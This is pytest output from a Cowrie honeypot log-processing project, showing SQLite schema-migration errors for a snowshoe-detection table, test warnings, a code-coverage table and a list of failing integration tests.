2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,056:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,059:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,060:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:59,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
=============================== warnings summary ===============================
tests/integration/test_cli_tools.py:270
  /home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:270: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_cowrie_db_sqlalchemy2.py:11
  /home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:11: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_cowrie_db_sqlalchemy2.py:342
  /home/speterson/cowrieprocessor/tests/integration/test_cowrie_db_sqlalchemy2.py:342: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_enrichment_flow.py:78
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:78: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_enrichment_flow.py:79
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:79: PytestUnknownMarkWarning: Unknown pytest.mark.enrichment - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.enrichment

tests/integration/test_enrichment_flow.py:100
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:100: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_enrichment_flow.py:101
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:101: PytestUnknownMarkWarning: Unknown pytest.mark.enrichment - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.enrichment

tests/integration/test_enrichment_flow.py:125
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:125: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_enrichment_flow.py:126
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:126: PytestUnknownMarkWarning: Unknown pytest.mark.enrichment - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.enrichment

tests/integration/test_enrichment_flow.py:127
  /home/speterson/cowrieprocessor/tests/integration/test_enrichment_flow.py:127: PytestUnknownMarkWarning: Unknown pytest.mark.slow - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.slow

tests/integration/test_migration_system.py:320
  /home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:320: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_password_enrichment.py:81
  /home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:81: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_password_enrichment.py:168
  /home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:168: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_password_enrichment.py:221
  /home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:221: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_password_enrichment.py:251
  /home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:251: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_password_enrichment.py:288
  /home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:288: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/integration/test_reporting_queries.py:374
  /home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:374: PytestUnknownMarkWarning: Unknown pytest.mark.integration - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.integration

tests/performance/test_enrichment_performance.py:594
  /home/speterson/cowrieprocessor/tests/performance/test_enrichment_performance.py:594: PytestUnknownMarkWarning: Unknown pytest.mark.asyncio - is this a typo?  You can register custom marks to avoid this warning - for details, see https://docs.pytest.org/en/stable/how-to/mark.html
    @pytest.mark.asyncio

test_array_extraction.py::test_array_extraction
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/_pytest/python.py:163: PytestReturnNotNoneWarning: Expected None, but test_array_extraction.py::test_array_extraction returned True, which will be an error in a future version of pytest.  Did you mean to use `assert` instead of `return`?
    warnings.warn(

test_client_fragment_repair.py::test_client_fragment_repair
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/_pytest/python.py:163: PytestReturnNotNoneWarning: Expected None, but test_client_fragment_repair.py::test_client_fragment_repair returned False, which will be an error in a future version of pytest.  Did you mean to use `assert` instead of `return`?
    warnings.warn(

test_cowrie_repair.py::test_cowrie_repair
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/_pytest/python.py:163: PytestReturnNotNoneWarning: Expected None, but test_cowrie_repair.py::test_cowrie_repair returned False, which will be an error in a future version of pytest.  Did you mean to use `assert` instead of `return`?
    warnings.warn(

tests/integration/test_enrichment_flow.py::test_high_risk_session_full_enrichment
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/vt/client.py:244: DeprecationWarning: There is no current event loop
    event_loop = asyncio.get_event_loop()

tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
  /home/speterson/cowrieprocessor/refresh_cache_and_reports.py:299: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    date_str = (datetime.utcnow() - timedelta(days=i)).strftime('%Y-%m-%d')

tests/integration/test_refresh_cache_sqlalchemy2.py::TestRefreshCacheIntegration::test_refresh_reports_integration
  /home/speterson/cowrieprocessor/refresh_cache_and_reports.py:317: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    start = datetime.utcnow() - timedelta(days=args.hot_weekly_days - 1)

tests/performance/test_enrichment_performance.py::TestMemoryUsagePerformance::test_concurrent_memory_usage
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/_pytest/threadexception.py:82: PytestUnhandledThreadExceptionWarning: Exception in thread Thread-5 (worker)
  
  Traceback (most recent call last):
    File "/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/threading.py", line 1043, in _bootstrap_inner
      self.run()
      ~~~~~~~~^^
    File "/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/threading.py", line 994, in run
      self._target(*self._args, **self._kwargs)
      ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  TypeError: TestMemoryUsagePerformance.test_concurrent_memory_usage.<locals>.worker() missing 1 required positional argument: 'worker_id'
  
    warnings.warn(pytest.PytestUnhandledThreadExceptionWarning(msg))

tests/performance/test_enrichment_performance.py::TestEnrichmentThroughput::test_async_enrichment_throughput
  /home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/_pytest/python.py:148: PytestUnhandledCoroutineWarning: async def functions are not natively supported and have been skipped.
  You need to install a suitable plugin for your async framework, for example:
    - anyio
    - pytest-asyncio
    - pytest-tornasync
    - pytest-trio
    - pytest-twisted
    warnings.warn(PytestUnhandledCoroutineWarning(msg.format(nodeid)))

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html

---------- coverage: platform linux, python 3.13.7-final-0 -----------
Name                                               Stmts   Miss  Cover   Missing
--------------------------------------------------------------------------------
cowrieprocessor/__init__.py                            7      4    43%   10-13
cowrieprocessor/cli/__init__.py                        2      0   100%
cowrieprocessor/cli/analyze.py                       512    512     0%   3-1152
cowrieprocessor/cli/cowrie_db.py                    1308    886    32%   100-109, 127-135, 144, 182-183, 231-240, 243-244, 251, 270, 315-319, 327-331, 340, 342-347, 354-359, 385, 397-398, 404-466, 488-495, 531-532, 543-544, 554-555, 558-618, 630-644, 671-836, 846, 850-899, 945, 994-997, 1006-1009, 1018, 1036-1038, 1045-1062, 1109-1133, 1148, 1161-1162, 1173-1175, 1186, 1193-1203, 1215-1297, 1305-1316, 1320-1350, 1354-1398, 1404-1424, 1443-1483, 1506-1507, 1529-1530, 1547, 1561, 1574-1798, 1824-1851, 1874-1930, 1934-1984, 1988-2059, 2063-2082, 2086-2136, 2151-2166, 2188-2190, 2211-2276, 2448-2809
cowrieprocessor/cli/db_config.py                      39     30    23%   17-44, 63-77
cowrieprocessor/cli/enrich_passwords.py              672    590    12%   69-72, 94-114, 130, 161-162, 176-177, 227, 267-331, 354-364, 380-441, 453-494, 506-578, 590-662, 675-837, 842-860, 879, 890-935, 940-964, 969-982, 987-1004, 1019-1061, 1070-1141, 1146-1172, 1177-1193, 1204-1451, 1460-1635
cowrieprocessor/cli/enrich_ssh_keys.py               375    375     0%   3-881
cowrieprocessor/cli/file_organizer.py                103    103     0%   7-169
cowrieprocessor/cli/health.py                         99     30    70%   42, 61-74, 78-82, 87, 93-94, 99-104, 120-121, 129-130, 148-150
cowrieprocessor/cli/ingest.py                         74      0   100%
cowrieprocessor/cli/report.py                        380    295    22%   42-48, 52-60, 73-114, 129-160, 169-186, 207-214, 226-251, 256-273, 278-318, 323-374, 379-446, 519-524, 536-628, 633-671, 676-701, 706-733, 738-760, 765-787
cowrieprocessor/db/__init__.py                         5      0   100%
cowrieprocessor/db/base.py                             7      0   100%
cowrieprocessor/db/engine.py                         110      3    97%   27, 74-75
cowrieprocessor/db/enhanced_dlq_migration.py          48     48     0%   6-288
cowrieprocessor/db/enhanced_dlq_models.py            119    119     0%   9-236
cowrieprocessor/db/enhanced_stored_procedures.py      40     40     0%   7-642
cowrieprocessor/db/json_utils.py                      52      0   100%
cowrieprocessor/db/migrations.py                     491    334    32%   73, 92, 106-108, 183-215, 221, 246-252, 266-279, 298-299, 302-303, 307, 335-338, 343-346, 351-354, 365, 380, 394, 421-674, 730-973, 978-1217, 1222-1575, 1580-1684, 1689-1790, 1795-1859, 1876-1882, 1895-1896
cowrieprocessor/db/models.py                         281     11    96%   87, 96, 105, 114, 123, 132-147
cowrieprocessor/db/stored_procedures.py               35     35     0%   7-397
cowrieprocessor/db/type_guards.py                     58      9    84%   61, 73-80
cowrieprocessor/enrichment/__init__.py                 8      1    88%   15
cowrieprocessor/enrichment/cache.py                  177     30    83%   45, 70, 143-144, 148-150, 161-163, 181-186, 194-195, 235, 239, 245, 251-254, 265-266, 285-286, 300-301
cowrieprocessor/enrichment/hibp_client.py             68      7    90%   118-121, 151-153
cowrieprocessor/enrichment/legacy_adapter.py          57     35    39%   55-57, 61-65, 69-73, 77-87, 91, 94-98, 101-105
cowrieprocessor/enrichment/password_extractor.py      24      0   100%
cowrieprocessor/enrichment/rate_limiting.py           92     29    68%   34-45, 55-57, 78-84, 130-136, 146, 159-162
cowrieprocessor/enrichment/ssh_key_analytics.py      176     95    46%   121-152, 167, 177, 217-260, 275, 297-298, 360-373, 391-458, 471-485, 504-510
cowrieprocessor/enrichment/ssh_key_extractor.py      172     22    87%   199-202, 262-266, 301-303, 336-339, 349-356, 373, 376, 381
cowrieprocessor/enrichment/telemetry.py               91      1    99%   149
cowrieprocessor/enrichment/virustotal_handler.py     142     19    87%   92-94, 112, 124, 129, 140, 149-153, 198-199, 206-207, 209-210, 274, 278
cowrieprocessor/enrichment/virustotal_quota.py       101      1    99%   100
cowrieprocessor/loader/__init__.py                     4      0   100%
cowrieprocessor/loader/bulk.py                       599    451    25%   114-119, 200-331, 345-397, 418-430, 434-454, 458-474, 481-491, 496-501, 504-532, 536-560, 564, 584-687, 690-740, 759-760, 776, 783-810, 814-861, 867-880, 891, 910-934, 941, 948-952, 957-1004, 1007-1011, 1014-1026, 1030-1055, 1059-1101, 1104-1110, 1113-1116, 1120-1124
cowrieprocessor/loader/cowrie_schema.py              210     26    88%   26-27, 245, 252-253, 294-295, 306, 326, 350, 360-364, 438, 503-507, 533-535, 541-542
cowrieprocessor/loader/defanging.py                  131      5    96%   266-269, 427
cowrieprocessor/loader/delta.py                      258    222    14%   57-60, 71-272, 288-313, 316, 325-338, 341-348, 360-385, 388-431, 434-444, 447-456, 459-465, 468, 471, 474-475, 478-479, 488-522
cowrieprocessor/loader/dlq_cli.py                    160    160     0%   7-292
cowrieprocessor/loader/dlq_enhanced_cli.py           160    160     0%   7-301
cowrieprocessor/loader/dlq_processor.py              429    241    44%   75-106, 111-115, 121, 127-128, 142, 163-164, 222-224, 267-291, 322-333, 348-362, 383-406, 425-433, 445, 452-455, 480, 484, 486, 488, 490, 496-508, 528, 530, 532, 536, 542-554, 559-572, 601, 603, 621-649, 657-661, 673-727, 731-736, 740-825, 829-863, 868-888
cowrieprocessor/loader/dlq_stored_proc_cli.py         95     95     0%   7-161
cowrieprocessor/loader/file_processor.py              67      0   100%
cowrieprocessor/loader/improved_hybrid.py            167    167     0%   8-333
cowrieprocessor/reporting/__init__.py                  4      0   100%
cowrieprocessor/reporting/builders.py                 95     10    89%   78-81, 89-92, 164, 187
cowrieprocessor/reporting/dal.py                     121      2    98%   80, 87
cowrieprocessor/reporting/es_publisher.py             27      2    93%   40, 43
cowrieprocessor/settings.py                           68      7    90%   20, 23, 31-32, 67, 92, 96
cowrieprocessor/status_emitter.py                    121     29    76%   25-46, 107, 144-145, 165, 175-180
cowrieprocessor/telemetry/__init__.py                  2      0   100%
cowrieprocessor/telemetry/otel.py                     25     13    48%   23-30, 40-44
cowrieprocessor/threat_detection/__init__.py           6      0   100%
cowrieprocessor/threat_detection/botnet.py           262    218    17%   95-148, 157-209, 224-243, 247-265, 282-294, 298-299, 317-335, 339-353, 363-422, 435-491, 501-529, 549-570, 581-608
cowrieprocessor/threat_detection/longtail.py         602    369    39%   110-111, 130-134, 145-150, 154-162, 166-171, 179-183, 223-293, 369-375, 401-403, 413-421, 431-435, 452-453, 471-534, 545-686, 712, 766-768, 902, 913-958, 969-987, 1015-1023, 1039-1041, 1055, 1091-1111, 1119-1121, 1151-1165, 1179-1224, 1228-1302, 1306-1390, 1396-1400, 1404-1408, 1412-1445
cowrieprocessor/threat_detection/metrics.py          111     15    86%   61, 68, 75, 82, 89, 93, 104, 108, 197-199, 204-206, 210
cowrieprocessor/threat_detection/snowshoe.py         181     13    93%   156-158, 192-196, 251, 344, 384-386
cowrieprocessor/threat_detection/storage.py          207    182    12%   34-43, 55-74, 91-218, 233-258, 287-461, 477-505, 528-561, 575, 585-587
cowrieprocessor/utils/unicode_sanitizer.py           109      7    94%   84, 104-105, 200, 223, 289-291
--------------------------------------------------------------------------------
TOTAL                                              10146   6058    40%
Coverage HTML written to dir htmlcov
Coverage XML written to file coverage.xml
Coverage JSON written to file coverage.json

=========================== short test summary info ============================
FAILED tests/integration/test_cli_tools.py::TestCowrieDatabaseCLI::test_cowrie_database_sqlite
FAILED tests/integration/test_cli_tools.py::TestCowrieDatabaseCLI::test_cowrie_database_optimization_sqlite
FAILED tests/integration/test_cli_tools.py::TestCowrieDatabaseCLI::test_cowrie_database_files_stats
FAILED tests/integration/test_cli_tools.py::TestCowrieDatabaseCLI::test_cowrie_database_backfill_files
FAILED tests/integration/test_cli_tools.py::TestHealthCLI::test_health_check_sqlite
FAILED tests/integration/test_cli_tools.py::TestCLIIntegration::test_full_cli_workflow_sqlite
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_engine_creation_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_optimize_method_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_check_integrity_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_analyze_data_quality_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_repair_data_quality_sqlalchemy2
FAILED tests/integration/test_cowrie_db_sqlalchemy2.py::TestCowrieDatabaseSQLAlchemy2Integration::test_sanitize_unicode_sqlalchemy2
